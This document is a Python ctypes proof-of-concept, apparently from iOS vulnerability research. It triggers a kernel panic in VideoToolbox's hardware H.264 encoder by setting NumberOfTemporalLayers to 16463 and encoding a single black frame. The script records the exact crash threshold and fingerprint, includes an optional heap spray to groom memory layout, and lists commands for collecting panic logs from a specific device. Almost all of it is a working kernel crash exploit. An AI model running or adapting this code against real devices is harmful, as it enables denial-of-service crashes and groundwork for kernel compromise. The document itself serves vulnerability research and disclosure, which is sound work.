"""
VideoToolbox NTL crash reproducer — runs on iPhone via ResearchHost.

Flow:
  1. Optionally spray the heap with tagged allocations (for layout analysis)
  2. Create a VTCompressionSession (H.264, 1920×1080)
  3. Set kVTCompressionPropertyKey_NumberOfTemporalLayers = NTL
  4. Create a black CVPixelBuffer
  5. Encode one frame → triggers fn_GOP_apply → fn_GOP_init_or_skip → kernel panic

NTL=16462 → safe (no crash); use to verify path reaches the kext
NTL=16463 → crash at init_list_head_full, far=0x59 (confirmed crash fingerprint)

After the crash: device reboots. On Mac, collect panic log:
  idevicecrashreport -k /tmp/ave2_panics/
  xcrun devicectl device sysdiagnose --udid EE5CFB9C-A7EE-5E4A-9CD7-F416885863BD /tmp/sysdiag.tar.gz
"""
import ctypes as C

# ── framework handles ──────────────────────────────────────────────────────────
CF  = C.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
VT  = C.CDLL("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox")
CV  = C.CDLL("/System/Library/Frameworks/CoreVideo.framework/CoreVideo")
CM  = C.CDLL("/System/Library/Frameworks/CoreMedia.framework/CoreMedia")
OC  = C.CDLL("/usr/lib/libobjc.A.dylib")

# ── CoreFoundation basics ──────────────────────────────────────────────────────
CF.CFNumberCreate.restype = C.c_void_p
CF.CFNumberCreate.argtypes = [C.c_void_p, C.c_int, C.c_void_p]
CF.CFDictionaryCreate.restype = C.c_void_p
CF.CFDictionaryCreate.argtypes = [C.c_void_p, C.POINTER(C.c_void_p), C.POINTER(C.c_void_p), C.c_long, C.c_void_p, C.c_void_p]
CF.CFDictionaryGetTypeID.restype = C.c_ulong
CF.CFRelease.argtypes = [C.c_void_p]
CF.CFStringCreateWithCString.restype = C.c_void_p
CF.CFStringCreateWithCString.argtypes = [C.c_void_p, C.c_char_p, C.c_uint32]
CF.CFRetain.restype = C.c_void_p
CF.CFRetain.argtypes = [C.c_void_p]
CF.kCFAllocatorDefault = C.c_void_p.in_dll(CF, "kCFAllocatorDefault")
CF.kCFTypeDictionaryKeyCallBacks = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryKeyCallBacks")
CF.kCFTypeDictionaryValueCallBacks = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryValueCallBacks")
kCFNumberSInt32Type = 3

def cf_num(v):
    n = C.c_int32(v)
    return CF.CFNumberCreate(None, kCFNumberSInt32Type, C.byref(n))

def cf_dict(keys, vals):
    arr_k = (C.c_void_p * len(keys))(*keys)
    arr_v = (C.c_void_p * len(vals))(*vals)
    return CF.CFDictionaryCreate(
        None, arr_k, arr_v, len(keys),
        C.byref(CF.kCFTypeDictionaryKeyCallBacks),
        C.byref(CF.kCFTypeDictionaryValueCallBacks)
    )

# ── VideoToolbox property key ──────────────────────────────────────────────────
# kVTCompressionPropertyKey_NumberOfTemporalLayers is a CFStringRef symbol
try:
    NTL_KEY = C.c_void_p.in_dll(VT, "kVTCompressionPropertyKey_NumberOfTemporalLayers").value
    print(f"NTL key VA: {hex(NTL_KEY)}")
except:
    # Fallback: create the CFString manually (known key string)
    NTL_KEY = CF.CFStringCreateWithCString(None, b"NumberOfTemporalLayers", 0x08000100)
    print(f"NTL key (created): {hex(NTL_KEY)}")

# ── VideoToolbox session ────────────────────────────────────────────────────────
VT.VTCompressionSessionCreate.restype = C.c_int32  # OSStatus
VT.VTCompressionSessionCreate.argtypes = [
    C.c_void_p,  # allocator
    C.c_int32,   # width
    C.c_int32,   # height
    C.c_uint32,  # codecType
    C.c_void_p,  # encoderSpecification
    C.c_void_p,  # sourceImageBufferAttributes
    C.c_void_p,  # compressedDataAllocator
    C.c_void_p,  # outputCallback
    C.c_void_p,  # outputCallbackRefCon
    C.POINTER(C.c_void_p),  # compressionSessionOut
]
VT.VTSessionSetProperty.restype = C.c_int32
VT.VTSessionSetProperty.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]
# CMTime: { int64 value; int32 timescale; uint32 flags; int64 epoch } = 24 bytes
# ARM64 AAPCS: structs >16 bytes passed by value on the stack. ctypes handles
# this correctly when you declare the argtypes with the Structure type.
class CMTime(C.Structure):
    _fields_ = [
        ("value",     C.c_int64),
        ("timescale", C.c_int32),
        ("flags",     C.c_uint32),  # kCMTimeFlags_Valid=1
        ("epoch",     C.c_int64),
    ]

VT.VTCompressionSessionEncodeFrame.restype = C.c_int32
VT.VTCompressionSessionEncodeFrame.argtypes = [
    C.c_void_p,          # session
    C.c_void_p,          # imageBuffer
    CMTime,              # presentationTimeStamp (by value, ARM64 stack)
    CMTime,              # duration
    C.c_void_p,          # frameProperties
    C.c_void_p,          # sourceFrameRefCon
    C.POINTER(C.c_uint32),  # infoFlagsOut
]
VT.VTCompressionSessionCompleteFrames.restype = C.c_int32
VT.VTCompressionSessionCompleteFrames.argtypes = [C.c_void_p, C.c_int64]

# kCMVideoCodecType_H264 = 'avc1' = 0x61766331
kH264 = 0x61766331

# ── CVPixelBuffer ──────────────────────────────────────────────────────────────
CV.CVPixelBufferCreate.restype = C.c_int32
CV.CVPixelBufferCreate.argtypes = [
    C.c_void_p,  # allocator
    C.c_ulong,   # width
    C.c_ulong,   # height
    C.c_uint32,  # pixelFormatType
    C.c_void_p,  # pixelBufferAttributes
    C.POINTER(C.c_void_p),  # pixelBufferOut
]
CV.CVPixelBufferLockBaseAddress.restype = C.c_int32
CV.CVPixelBufferLockBaseAddress.argtypes = [C.c_void_p, C.c_uint32]
CV.CVPixelBufferUnlockBaseAddress.argtypes = [C.c_void_p, C.c_uint32]
CV.CVPixelBufferRelease.argtypes = [C.c_void_p]

kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange = 0x34323076  # '420v'

# ── output callback (do-nothing, we just want the encode trigger) ──────────────
CALLBACK_TYPE = C.CFUNCTYPE(None, C.c_void_p, C.c_void_p, C.c_int32, C.c_void_p, C.c_void_p)

@CALLBACK_TYPE
def output_cb(outputCallbackRefCon, sourceFrameRefCon, status, infoFlags, sampleBuffer):
    pass

def run(NTL=16463, width=1920, height=1080, spray_heap=False):
    print(f"=== VTSession crash reproducer: NTL={NTL}, {width}x{height} ===")

    # ── optional heap spray ─────────────────────────────────────────────────
    spray_objects = []
    if spray_heap:
        print("Spraying heap with 512 CF dicts...")
        for i in range(512):
            k = CF.CFStringCreateWithCString(None, f"spray_key_{i}".encode(), 0x08000100)
            v = cf_num(0xDEAD0000 | i)
            d = cf_dict([k], [v])
            spray_objects.append(d)
        print(f"  Sprayed {len(spray_objects)} objects")

    # ── create VTCompressionSession ─────────────────────────────────────────
    session = C.c_void_p(0)
    status = VT.VTCompressionSessionCreate(
        None, width, height, kH264,
        None, None, None,
        output_cb, None,
        C.byref(session)
    )
    print(f"VTCompressionSessionCreate: status={status:#010x} session={session.value and hex(session.value) or 'NULL'}")
    if status != 0 or not session.value:
        print("FAILED to create session — may need H.264 encoding entitlement or hardware encoder")
        return

    # ── set NumberOfTemporalLayers = NTL ────────────────────────────────────
    ntl_val = cf_num(NTL)
    status = VT.VTSessionSetProperty(session.value, NTL_KEY, ntl_val)
    CF.CFRelease(ntl_val)
    print(f"VTSessionSetProperty(NTL={NTL}): status={status:#010x}")
    if status != 0:
        print(f"  Property set failed — VideoToolbox may have validated/rejected NTL={NTL}")
        print(f"  0x80000135 = kVTPropertyNotSupportedErr, 0x80000124 = kVTPropertyReadOnlyErr")
        return

    # ── create a black CVPixelBuffer ────────────────────────────────────────
    pixbuf = C.c_void_p(0)
    status = CV.CVPixelBufferCreate(
        None, width, height,
        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
        None,
        C.byref(pixbuf)
    )
    print(f"CVPixelBufferCreate: status={status:#010x} buf={pixbuf.value and hex(pixbuf.value) or 'NULL'}")
    if status != 0 or not pixbuf.value:
        return

    # Zero-fill the pixel buffer (black frame)
    CV.CVPixelBufferLockBaseAddress(pixbuf.value, 0)
    CV.CVPixelBufferUnlockBaseAddress(pixbuf.value, 0)

    # ── encode one frame ─────────────────────────────────────────────────────
    pts = CMTime(value=0,    timescale=90000, flags=1, epoch=0)
    dur = CMTime(value=3000, timescale=90000, flags=1, epoch=0)

    info_flags = C.c_uint32(0)
    print(f"Calling VTCompressionSessionEncodeFrame with NTL={NTL}...")
    print("  (If NTL=16463 and the crash path is reached, the device will kernel panic NOW)")

    status = VT.VTCompressionSessionEncodeFrame(
        session.value,
        pixbuf.value,
        pts,             # CMTime by value — ctypes places 24 bytes on stack per ARM64 ABI
        dur,
        None,            # frameProperties
        None,            # sourceFrameRefCon
        C.byref(info_flags),
    )
    print(f"VTCompressionSessionEncodeFrame returned: status={status:#010x}")
    print("  (If we got here with NTL=16463, the crash path may not have been taken)")
    print(f"  info_flags={info_flags.value:#010x}")
    print("  kVTEncodeInfo_Asynchronous=0x1, kVTEncodeInfo_FrameDropped=0x2")

    CV.CVPixelBufferRelease(pixbuf.value)
    print("DONE — no panic triggered (NTL may have been clamped or CMTime was malformed)")

# ── Entry ──────────────────────────────────────────────────────────────────────
NTL_TARGET = 16463   # change to 16462 for safe test
run(NTL=NTL_TARGET, spray_heap=False)
